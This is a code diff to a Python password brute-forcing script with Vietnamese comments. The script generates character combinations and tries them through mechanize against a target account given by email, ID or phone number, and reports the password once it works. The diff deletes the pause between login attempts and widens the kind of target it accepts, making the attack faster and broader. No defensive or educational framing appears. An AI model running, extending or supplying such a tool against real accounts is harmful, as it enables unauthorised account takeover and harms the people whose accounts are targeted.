@@ -1,15 +1,8 @@
 import itertools
-import string
-import sys
-import time
 import mechanize
 
 # Các ký tự để thử trong mật khẩu
 characters = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890.?!@"
-
-def write(text):
-    sys.stdout.write(text)
-    sys.stdout.flush()
 
 def generate_passwords():
     length = 1
@@ -55,8 +48,7 @@ def Main(target):
         elif result == 2:
             print(f"Account locked with 2-factor authentication. Password was: {passwd}")
             break
-        time.sleep(1)  # Thời gian nghỉ giữa các lần thử (có thể điều chỉnh)
 
 if __name__ == "__main__":
-    target_email = input("Enter the target's email: ")
-    Main(target_email)
+    target = input("Enter the target's email, ID, or phone number: ")
+    Main(target)
